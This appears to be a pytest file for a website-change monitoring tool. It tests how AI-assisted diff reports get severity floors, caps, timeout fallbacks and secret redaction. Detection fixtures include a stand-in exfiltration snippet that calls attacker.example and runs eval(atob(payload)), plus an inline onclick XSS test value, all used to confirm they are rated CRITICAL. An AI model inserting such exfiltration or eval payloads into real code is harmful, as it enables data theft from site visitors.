"""Focused unit tests for report.generator edge paths."""

from __future__ import annotations

import json

import pytest

from test_ui.cli import _open_orchestrator
from test_ui.config import settings
from test_ui.report.ai_client import AIClient
from test_ui.report.generator import (
    _apply_severity_cap_to_response,
    _apply_severity_floor_to_response,
    _maximum_business_impact_for_capped_severity,
    _maximum_severity_from_structured_data,
    _minimum_severity_from_structured_data,
    _normalize_business_impact_for_severity,
    _synthesize_timeout_response,
)


@pytest.mark.asyncio
async def test_process_single_url_surfaces_comparator_error_without_ai_call(
    tmp_path, monkeypatch
):
    """Comparator error payloads should become explicit ai_error records."""
    monkeypatch.setattr(settings, "ai_enabled", True)
    # If the code accidentally tries to call AI, this unreachable endpoint
    # would trigger a transport error and fail the assertions below.
    monkeypatch.setattr(settings, "ai_analyzer_service_url", "http://127.0.0.1:1")

    run_root = tmp_path / "report" / "01-01-2099" / "run"
    run_root.mkdir(parents=True)
    url_dir = tmp_path / "comparator" / "01-01-2099" / "site-1"
    url_dir.mkdir(parents=True)

    url_data = {
        "url_name": "site-1",
        "url_dir": url_dir,
        "structured_data_path": None,
        "has_changes": True,
        "comparison_data": {
            "metadata": {"url": "https://example.test/site-1"},
            "result": {
                "error": "missing_baseline",
                "message": "Site not found in baseline",
            },
        },
    }

    async with _open_orchestrator() as orch:
        out = await orch.reporter.process_single_url(url_data, run_root)

    assert out["processing_status"] == "error"
    assert out["ai_analysis"]["result_type"] == "analysis_error"
    assert out["ai_analysis"]["error_type"] == "config_error"
    assert "Comparator error for site-1" in out["ai_analysis"]["details"]
    assert "missing_baseline" in out["ai_analysis"]["details"]

    saved = run_root / "site-1" / "ai_error.json"
    assert saved.exists()
    payload = json.loads(saved.read_text(encoding="utf-8"))
    assert payload["result_type"] == "analysis_error"


def test_timeout_fallback_keeps_analysis_success_shape_contract():
    """Timeout fallback should still satisfy analysis_success field expectations."""
    response = _synthesize_timeout_response(
        request_id="req-123",
        structured_data={},
    )
    assert response["result_type"] == "analysis_success"
    assert isinstance(response["prompt_sha256"], str)
    assert len(response["prompt_sha256"]) == 64


def test_minimum_severity_warns_for_visual_only_changes():
    """Comparator-confirmed visual diffs should not be classified SAFE."""
    structured_data = {
        "change_summary": {
            "change_categories": {
                "visual": {
                    "screenshot_similarity": 0.991,
                    "visual_changes": True,
                    "layout_shifts": False,
                }
            }
        },
        "html_changes": {"changes": []},
        "css_changes": {"changes": []},
        "js_changes": {"changes": []},
    }

    assert _minimum_severity_from_structured_data(structured_data) == "WARNING"


def test_minimum_severity_warns_for_medium_html_metadata_changes():
    """Comparator-confirmed review-required HTML diffs should not remain SAFE."""
    structured_data = {
        "html_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "type": "attributes",
                    "element": "meta[og:title]",
                    "change": "meta_removed",
                    "old_value": "AFR-TAMPER-PHISH",
                    "impact": "low",
                },
                {
                    "type": "attributes",
                    "element": "html[0].lang",
                    "change": "attribute_changed",
                    "old_value": "fr",
                    "new_value": "en",
                    "impact": "medium",
                },
            ],
            "summary": {
                "total_changes": 2,
                "meta_changes": 1,
                "high_impact_changes": 0,
                "medium_impact_changes": 1,
                "severity": "medium",
            },
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "WARNING"


def test_maximum_severity_caps_medium_html_metadata_changes():
    """Medium HTML/meta diffs should not become model-only criticals."""
    structured_data = {
        "html_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "type": "attributes",
                    "element": "meta[og:title]",
                    "change": "meta_removed",
                    "old_value": "AFR-TAMPER-PHISH",
                    "impact": "low",
                }
            ],
            "summary": {
                "total_changes": 1,
                "meta_changes": 1,
                "high_impact_changes": 0,
                "medium_impact_changes": 0,
                "severity": "medium",
            },
        }
    }

    assert _maximum_severity_from_structured_data(structured_data) == "WARNING"


@pytest.mark.parametrize(
    ("user_impact", "expected"),
    [("low", "MEDIUM"), ("medium", "MEDIUM"), ("high", "HIGH")],
)
def test_maximum_business_impact_for_capped_warning(user_impact, expected):
    structured_data = {
        "change_summary": {
            "overall_assessment": {
                "user_impact": user_impact,
            }
        }
    }

    assert (
        _maximum_business_impact_for_capped_severity(structured_data, "WARNING")
        == expected
    )


def test_minimum_severity_critical_for_inline_event_handler_xss():
    """Inline event handlers execute JS and must be treated as XSS-class."""
    structured_data = {
        "html_changes": {
            "changes": [
                {
                    "type": "attributes",
                    "element": "a[0].onclick",
                    "description": "Dynamic attribute a[0].onclick added",
                    "old_value": "",
                    "new_value": "alert('AFR-TAMPER-XSS')",
                }
            ]
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "CRITICAL"
    assert _maximum_severity_from_structured_data(structured_data) == "CRITICAL"


def test_minimum_severity_warns_for_high_impact_css_changes():
    """High-impact CSS diffs should not be classified SAFE."""
    structured_data = {
        "css_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "change_type": "selector_modified",
                    "selector": "body",
                    "impact": "high",
                    "property_changes": [
                        {
                            "property": "color",
                            "old_value": "#ff0066",
                            "new_value": "#404040",
                        }
                    ],
                }
            ],
            "summary": {"severity": "high"},
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "WARNING"


def test_minimum_severity_critical_for_css_hide_or_block_rules():
    """CSS rules that hide content or block interaction are critical review items."""
    structured_data = {
        "css_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "change_type": "selector_removed",
                    "selector": "h1, .gi-link, .gi-button-primary",
                    "impact": "high",
                    "properties": {"display": "none !important"},
                },
                {
                    "change_type": "selector_removed",
                    "selector": ".gi-button-primary, button[type=submit]",
                    "impact": "low",
                    "properties": {"pointer-events": "none"},
                },
            ],
            "summary": {"severity": "high"},
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "CRITICAL"


def test_minimum_severity_warns_for_high_impact_js_changes():
    """High-impact JS diffs should require review without making all JS critical."""
    structured_data = {
        "js_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "change_type": "function_modified",
                    "function_name": "trackCheckout",
                    "impact": "high",
                    "code_snippet": "function trackCheckout() { return true; }",
                }
            ],
            "summary": {"severity": "high", "functionality_impact": "high"},
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "WARNING"


def test_minimum_severity_critical_for_js_execution_or_exfil_markers():
    """Dangerous JS execution/exfil primitives should be deterministic criticals."""
    structured_data = {
        "js_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "change_type": "security_indicator_added",
                    "file": "app.js",
                    "impact": "high",
                    "code_snippet": (
                        "fetch('https://attacker.example/exfil'); "
                        "eval(atob(payload));"
                    ),
                }
            ],
            "summary": {"severity": "high"},
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "CRITICAL"


def test_minimum_severity_warns_for_js_cookie_or_storage_markers():
    """Cookie/storage JS changes are review-required even without obvious XSS sinks."""
    structured_data = {
        "js_changes": {
            "changes_detected": True,
            "changes": [
                {
                    "change_type": "security_indicator_added",
                    "file": "analytics.js",
                    "impact": "medium",
                    "code_snippet": (
                        "document.cookie = 'seen=true'; "
                        "localStorage.setItem('checkout', id);"
                    ),
                }
            ],
            "summary": {"severity": "medium"},
        }
    }

    assert _minimum_severity_from_structured_data(structured_data) == "WARNING"


def test_critical_severity_normalizes_business_impact_to_high():
    response = {
        "overall_severity": "CRITICAL",
        "business_impact": "MEDIUM",
    }

    _normalize_business_impact_for_severity(response)

    assert response["business_impact"] == "HIGH"


@pytest.mark.parametrize("impact", ["NONE", "LOW"])
def test_warning_severity_normalizes_business_impact_to_medium(impact):
    response = {
        "overall_severity": "WARNING",
        "business_impact": impact,
    }

    _normalize_business_impact_for_severity(response)

    assert response["business_impact"] == "MEDIUM"


def test_timeout_fallback_explains_visual_only_floor():
    """Timeout fallback should explain visual floors, not emit generic SAFE."""
    structured_data = {
        "change_summary": {
            "change_categories": {
                "visual": {
                    "screenshot_similarity": 0.991,
                    "visual_changes": True,
                    "layout_shifts": False,
                }
            }
        },
        "html_changes": {"changes": []},
        "css_changes": {"changes": []},
        "js_changes": {"changes": []},
    }

    response = _synthesize_timeout_response(
        request_id="req-visual", structured_data=structured_data
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"
    assert "comparator-confirmed visual diff" in response["detailed_analysis"][
        "visual_changes"
    ][0]


def test_severity_floor_augments_visual_response_and_removes_dismissive_action():
    response = {
        "overall_severity": "SAFE",
        "business_impact": "LOW",
        "detailed_analysis": {
            "visual_changes": ["Likely rendering artifact."],
            "functional_impact": ["No functional impact."],
            "technical_correlation": ["No code changes."],
        },
        "recommendations": {
            "immediate_actions": ["No immediate action required."],
            "review_items": [],
            "acceptance_criteria": "Looks fine.",
        },
    }

    _apply_severity_floor_to_response(
        response,
        min_sev="WARNING",
        reasons=["comparator-confirmed visual diff (screenshot_similarity=0.991)"],
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"
    assert response["detailed_analysis"]["visual_changes"][0].startswith(
        "Comparator-confirmed visual difference requires human review"
    )
    assert response["detailed_analysis"]["technical_correlation"][0].startswith(
        "Deterministic severity floor applied:"
    )
    assert all(
        "no immediate action" not in action.lower()
        for action in response["recommendations"]["immediate_actions"]
    )
    assert response["recommendations"]["immediate_actions"][0].startswith(
        "Review the baseline/current/visual_diff screenshots"
    )


def test_severity_floor_augments_security_response():
    response = {
        "overall_severity": "SAFE",
        "business_impact": "LOW",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": [],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": ["No immediate action required."],
            "review_items": [],
            "acceptance_criteria": "Looks fine.",
        },
    }

    _apply_severity_floor_to_response(
        response,
        min_sev="CRITICAL",
        reasons=["security-sensitive diff marker: onclick"],
    )

    assert response["overall_severity"] == "CRITICAL"
    assert response["business_impact"] == "HIGH"
    assert response["detailed_analysis"]["technical_correlation"][0] == (
        "Deterministic severity floor applied: "
        "security-sensitive diff marker: onclick."
    )
    assert response["recommendations"]["immediate_actions"][0].startswith(
        "Review the structured diff for security-sensitive markers"
    )


def test_severity_cap_downgrades_model_only_critical_response():
    response = {
        "overall_severity": "CRITICAL",
        "business_impact": "HIGH",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": ["Model called it critical."],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": ["Review immediately."],
            "review_items": [],
            "acceptance_criteria": "Looks critical.",
        },
    }

    _apply_severity_cap_to_response(
        response,
        max_sev="WARNING",
        reasons=["no deterministic critical marker in structured diff data"],
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "HIGH"
    assert response["detailed_analysis"]["technical_correlation"][0] == (
        "Deterministic severity cap applied: "
        "no deterministic critical marker in structured diff data."
    )
    assert response["detailed_analysis"]["functional_impact"][0].startswith(
        "Final severity is capped at WARNING"
    )
    assert response["recommendations"]["review_items"][0].startswith(
        "Verify the model narrative"
    )


def test_severity_cap_can_cap_business_impact():
    response = {
        "overall_severity": "CRITICAL",
        "business_impact": "HIGH",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": [],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": [],
            "review_items": [],
            "acceptance_criteria": "Looks critical.",
        },
    }

    _apply_severity_cap_to_response(
        response,
        max_sev="WARNING",
        reasons=["no deterministic critical marker in structured diff data"],
        max_impact="MEDIUM",
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"


def test_severity_floor_augments_html_response_with_html_specific_action():
    response = {
        "overall_severity": "SAFE",
        "business_impact": "LOW",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": [],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": ["No immediate action required."],
            "review_items": [],
            "acceptance_criteria": "Looks fine.",
        },
    }

    _apply_severity_floor_to_response(
        response,
        min_sev="WARNING",
        reasons=["medium-severity HTML diff summary"],
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"
    assert response["detailed_analysis"]["visual_changes"][0].startswith(
        "Review-required HTML diff marker found"
    )
    assert response["recommendations"]["immediate_actions"][0].startswith(
        "Review the HTML diff"
    )


def test_severity_floor_augments_css_response_with_css_specific_action():
    response = {
        "overall_severity": "SAFE",
        "business_impact": "LOW",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": [],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": ["No immediate action required."],
            "review_items": [],
            "acceptance_criteria": "Looks fine.",
        },
    }

    _apply_severity_floor_to_response(
        response,
        min_sev="WARNING",
        reasons=["high-impact CSS diff: body"],
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"
    assert response["detailed_analysis"]["visual_changes"][0].startswith(
        "Review-required CSS diff marker found"
    )
    assert response["recommendations"]["immediate_actions"][0].startswith(
        "Review the CSS diff"
    )


def test_severity_floor_augments_js_response_with_js_specific_action():
    response = {
        "overall_severity": "SAFE",
        "business_impact": "LOW",
        "detailed_analysis": {
            "visual_changes": [],
            "functional_impact": [],
            "technical_correlation": [],
        },
        "recommendations": {
            "immediate_actions": ["No immediate action required."],
            "review_items": [],
            "acceptance_criteria": "Looks fine.",
        },
    }

    _apply_severity_floor_to_response(
        response,
        min_sev="WARNING",
        reasons=["high-impact JavaScript diff: trackCheckout"],
    )

    assert response["overall_severity"] == "WARNING"
    assert response["business_impact"] == "MEDIUM"
    assert response["detailed_analysis"]["visual_changes"][0].startswith(
        "Review-required JavaScript diff marker found"
    )
    assert response["recommendations"]["immediate_actions"][0].startswith(
        "Review the JavaScript diff"
    )


@pytest.mark.asyncio
async def test_process_single_url_reports_structured_data_contract_error(
    tmp_path, monkeypatch
):
    """Invalid/missing diff JSON should fail before AI call with clear error details."""
    monkeypatch.setattr(settings, "ai_enabled", True)
    monkeypatch.setattr(settings, "ai_analyzer_service_url", "http://127.0.0.1:1")

    run_root = tmp_path / "report" / "01-01-2099" / "run"
    run_root.mkdir(parents=True)
    url_dir = tmp_path / "comparator" / "01-01-2099" / "site-1"
    diffs_dir = url_dir / "diffs"
    diffs_dir.mkdir(parents=True)

    def _w(name: str, payload: dict) -> None:
        (diffs_dir / name).write_text(json.dumps(payload), encoding="utf-8")

    _w(
        "change_summary.json",
        {
            "overall_assessment": {},
            "change_categories": {},
            "affected_components": [],
            "recommendation": "",
            "ai_analysis_priority": "low",
        },
    )
    _w(
        "html_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "changes": [],
            "summary": {},
        },
    )
    _w(
        "css_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )
    # Intentionally omit js_changes.json.

    url_data = {
        "url_name": "site-1",
        "url_dir": url_dir,
        "structured_data_path": diffs_dir,
        "has_changes": True,
        "comparison_data": {
            "metadata": {"url": "https://example.test/site-1"},
            "result": {"changes_detected": True},
        },
    }

    async with _open_orchestrator() as orch:
        out = await orch.reporter.process_single_url(url_data, run_root)

    assert out["processing_status"] == "error"
    assert out["ai_analysis"]["result_type"] == "analysis_error"
    assert out["ai_analysis"]["error_type"] == "config_error"
    assert "Structured diff files missing/invalid" in out["ai_analysis"]["details"]
    assert "js_changes.json: file not found" in out["ai_analysis"]["details"]

    saved = run_root / "site-1" / "ai_error.json"
    assert saved.exists()
    payload = json.loads(saved.read_text(encoding="utf-8"))
    assert payload["result_type"] == "analysis_error"


@pytest.mark.asyncio
async def test_process_single_url_caps_model_only_critical_response(
    tmp_path, monkeypatch
):
    """Model-only critical ratings should be capped before artifacts are saved."""
    monkeypatch.setattr(settings, "ai_enabled", True)

    async def fake_send(self, ai_request: dict) -> dict:
        return {
            "schema_version": "2026-04-30.1",
            "result_type": "analysis_success",
            "request_id": ai_request["request_id"],
            "model": "test-model",
            "prompt_sha256": "0" * 64,
            "overall_severity": "CRITICAL",
            "business_impact": "HIGH",
            "detailed_analysis": {
                "visual_changes": ["none"],
                "functional_impact": ["model critical"],
                "technical_correlation": ["model narrative"],
            },
            "recommendations": {
                "immediate_actions": ["review"],
                "review_items": [],
                "acceptance_criteria": "reviewed",
            },
            "confidence_score": 0.9,
        }

    monkeypatch.setattr(AIClient, "send", fake_send)

    run_root = tmp_path / "report" / "01-01-2099" / "run"
    run_root.mkdir(parents=True)
    url_dir = tmp_path / "comparator" / "01-01-2099" / "site-1"
    diffs_dir = url_dir / "diffs"
    diffs_dir.mkdir(parents=True)

    def _w(name: str, payload: dict) -> None:
        (diffs_dir / name).write_text(json.dumps(payload), encoding="utf-8")

    _w(
        "change_summary.json",
        {
            "overall_assessment": {
                "changes_detected": True,
                "change_severity": "medium",
                "user_impact": "medium",
                "requires_review": True,
            },
            "change_categories": {
                "visual": {"visual_changes": False},
                "technical": {
                    "html_changes": True,
                    "css_changes": False,
                    "js_changes": False,
                    "asset_changes": False,
                },
            },
            "affected_components": ["title_and_metadata"],
            "recommendation": "review metadata",
            "ai_analysis_priority": "medium",
        },
    )
    _w(
        "html_changes.json",
        {
            "changes_detected": True,
            "change_types": ["attributes"],
            "changes": [
                {
                    "type": "attributes",
                    "element": "meta[og:title]",
                    "change": "meta_removed",
                    "old_value": "AFR-TAMPER-PHISH",
                    "new_value": "",
                    "impact": "low",
                }
            ],
            "summary": {
                "total_changes": 1,
                "meta_changes": 1,
                "high_impact_changes": 0,
                "medium_impact_changes": 0,
                "severity": "medium",
            },
        },
    )
    _w(
        "css_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )
    _w(
        "js_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )

    url_data = {
        "url_name": "site-1",
        "url_dir": url_dir,
        "structured_data_path": diffs_dir,
        "has_changes": True,
        "comparison_data": {
            "metadata": {"url": "https://example.test/site-1"},
            "result": {"changes_detected": True},
        },
    }

    async with _open_orchestrator() as orch:
        out = await orch.reporter.process_single_url(url_data, run_root)

    assert out["ai_analysis"]["overall_severity"] == "WARNING"
    assert out["ai_analysis"]["business_impact"] == "MEDIUM"
    assert out["processing_status"] == "success"
    saved = json.loads(
        (run_root / "site-1" / "ai_analysis.json").read_text(encoding="utf-8")
    )
    assert saved["overall_severity"] == "WARNING"
    assert saved["business_impact"] == "MEDIUM"
    assert saved["detailed_analysis"]["technical_correlation"][0].startswith(
        "Deterministic severity cap applied"
    )


@pytest.mark.asyncio
async def test_process_single_url_persists_redacted_structured_data(
    tmp_path, monkeypatch
):
    """Report artifacts should not persist obvious structured-data secrets."""
    monkeypatch.setattr(settings, "ai_enabled", True)
    monkeypatch.setattr(settings, "report_redact_structured_data", True)

    async def fake_send(self, ai_request: dict) -> dict:
        return {
            "schema_version": "2026-04-30.1",
            "result_type": "analysis_success",
            "request_id": ai_request["request_id"],
            "model": "test-model",
            "prompt_sha256": "0" * 64,
            "overall_severity": "SAFE",
            "business_impact": "LOW",
            "detailed_analysis": {
                "visual_changes": ["none"],
                "functional_impact": ["none"],
                "technical_correlation": ["none"],
            },
            "recommendations": {
                "immediate_actions": [],
                "review_items": ["none"],
                "acceptance_criteria": "none",
            },
            "confidence_score": 0.9,
        }

    monkeypatch.setattr(AIClient, "send", fake_send)

    run_root = tmp_path / "report" / "01-01-2099" / "run"
    run_root.mkdir(parents=True)
    url_dir = tmp_path / "comparator" / "01-01-2099" / "site-1"
    diffs_dir = url_dir / "diffs"
    diffs_dir.mkdir(parents=True)
    (diffs_dir / "visual_diff.png").write_bytes(
        bytes.fromhex(
            "89504e470d0a1a0a0000000d4948445200000001000000010806000000"
            "1f15c4890000000a49444154789c6360000002000100ffff030000060005"
            "57bfab0000000049454e44ae426082"
        )
    )

    def _w(name: str, payload: dict) -> None:
        (diffs_dir / name).write_text(json.dumps(payload), encoding="utf-8")

    _w(
        "change_summary.json",
        {
            "overall_assessment": {},
            "change_categories": {},
            "affected_components": [],
            "recommendation": "Email admin@example.com",
            "ai_analysis_priority": "low",
        },
    )
    _w(
        "html_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "changes": [],
            "summary": {},
        },
    )
    _w(
        "css_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )
    _w(
        "js_changes.json",
        {
            "changes_detected": True,
            "change_types": ["functionality"],
            "files_changed": ["app.js"],
            "changes": [{"code_snippet": "const api_key=sk_live_123456;"}],
            "summary": {},
        },
    )

    url_data = {
        "url_name": "site-1",
        "url_dir": url_dir,
        "structured_data_path": diffs_dir,
        "has_changes": True,
        "comparison_data": {
            "metadata": {"url": "https://example.test/site-1"},
            "result": {"changes_detected": True},
        },
    }

    async with _open_orchestrator() as orch:
        out = await orch.reporter.process_single_url(url_data, run_root)

    assert out["processing_status"] == "success"
    saved = json.loads(
        (run_root / "site-1" / "structured_data.json").read_text(encoding="utf-8")
    )
    dumped = json.dumps(saved)
    assert "sk_live_123456" not in dumped
    assert "admin@example.com" not in dumped
    assert "[REDACTED]" in dumped
    assert "[REDACTED_EMAIL]" in dumped


@pytest.mark.asyncio
async def test_process_single_url_allows_structured_data_without_screenshots(
    tmp_path, monkeypatch
):
    """Missing screenshot artifacts should not fail structured-only AI analysis."""
    monkeypatch.setattr(settings, "ai_enabled", True)
    seen_request: dict = {}

    async def fake_send(self, ai_request: dict) -> dict:
        seen_request.update(ai_request)
        return {
            "schema_version": "2026-04-30.1",
            "result_type": "analysis_success",
            "request_id": ai_request["request_id"],
            "model": "test-model",
            "prompt_sha256": "0" * 64,
            "overall_severity": "WARNING",
            "business_impact": "MEDIUM",
            "detailed_analysis": {
                "visual_changes": ["screenshots unavailable"],
                "functional_impact": ["structured diff reviewed"],
                "technical_correlation": ["HTML changed"],
            },
            "recommendations": {
                "immediate_actions": ["review structured diff"],
                "review_items": ["html_changes"],
                "acceptance_criteria": "changes reviewed",
            },
            "confidence_score": 0.7,
        }

    monkeypatch.setattr(AIClient, "send", fake_send)

    run_root = tmp_path / "report" / "01-01-2099" / "run"
    run_root.mkdir(parents=True)
    url_dir = tmp_path / "comparator" / "01-01-2099" / "site-1"
    diffs_dir = url_dir / "diffs"
    diffs_dir.mkdir(parents=True)

    def _w(name: str, payload: dict) -> None:
        (diffs_dir / name).write_text(json.dumps(payload), encoding="utf-8")

    _w(
        "change_summary.json",
        {
            "overall_assessment": {},
            "change_categories": {},
            "affected_components": ["header"],
            "recommendation": "review",
            "ai_analysis_priority": "medium",
        },
    )
    _w(
        "html_changes.json",
        {
            "changes_detected": True,
            "change_types": ["content"],
            "changes": [{"type": "text", "old_value": "A", "new_value": "B"}],
            "summary": {},
        },
    )
    _w(
        "css_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )
    _w(
        "js_changes.json",
        {
            "changes_detected": False,
            "change_types": [],
            "files_changed": [],
            "changes": [],
            "summary": {},
        },
    )

    url_data = {
        "url_name": "site-1",
        "url_dir": url_dir,
        "structured_data_path": diffs_dir,
        "has_changes": True,
        "comparison_data": {
            "metadata": {
                "url": "https://example.test/site-1",
                "baseline_path": str(tmp_path / "missing-baseline"),
                "current_path": str(tmp_path / "missing-current"),
            },
            "result": {"changes_detected": True},
        },
    }

    async with _open_orchestrator() as orch:
        out = await orch.reporter.process_single_url(url_data, run_root)

    assert out["processing_status"] == "success"
    assert out["screenshots_available"] == []
    assert seen_request["screenshots"] == {
        "baseline": None,
        "current": None,
        "visual_diff": None,
    }
    assert (run_root / "site-1" / "ai_analysis.json").exists()
